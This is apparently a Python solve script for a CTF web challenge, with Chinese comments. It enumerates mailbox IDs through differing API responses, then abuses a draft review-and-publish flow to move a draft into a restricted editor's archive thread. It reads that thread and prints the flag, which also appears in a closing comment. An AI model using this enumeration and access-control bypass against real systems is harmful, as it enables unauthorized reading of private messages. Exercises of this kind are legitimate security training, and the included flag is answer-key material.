import re, requests

BASE = "http://64ef9b7429d326d21d317108.http-ctf2.dasctf.com:80"
s = requests.Session(); s.trust_env = False

# 1) 签入
s.post(f"{BASE}/api/login", json={"u": "u1"})

# 2) 用 review 回执枚举信箱，定位审阅台
draft = s.post(f"{BASE}/api/draft",
               json={"thread": "mb-2081", "body": "起稿"}).json()["draft"]
for n in range(2000, 2111):
    slug = "mb-%d" % n
    r = s.post(f"{BASE}/api/review", json={"draft": draft, "dest": slug})
    if r.status_code == 404:            # 不存在
        continue
    j = r.json()
    if r.status_code == 200:            # 是审阅台，草稿已被搬进去
        print("审阅台", slug, j["moved_to"])
        draft = s.post(f"{BASE}/api/draft",
                       json={"thread": "mb-2081", "body": "起稿"}).json()["draft"]
    else:                               # 存在但不是审阅台 → 回显标题
        print("信箱", slug, re.search(r":(.+)$", j["e"]).group(1))

# 3) 三步发稿，把草稿送进主编·密档
draft = s.post(f"{BASE}/api/draft",
               json={"thread": "mb-2081", "body": "存档室例行交接"}).json()["draft"]
s.post(f"{BASE}/api/review", json={"draft": draft, "dest": "mb-2077"})
s.post(f"{BASE}/api/publish", json={"draft": draft})

# 4) 密档已对你开放
msgs = s.get(f"{BASE}/api/thread/mb-2077").json()["messages"]
print(re.search(r"CTF2\{[0-9a-f-]{36}\}", " ".join(m["body"] for m in msgs)).group(0))
# CTF2{e67847c6-3104-4349-8770-81e8562e6004}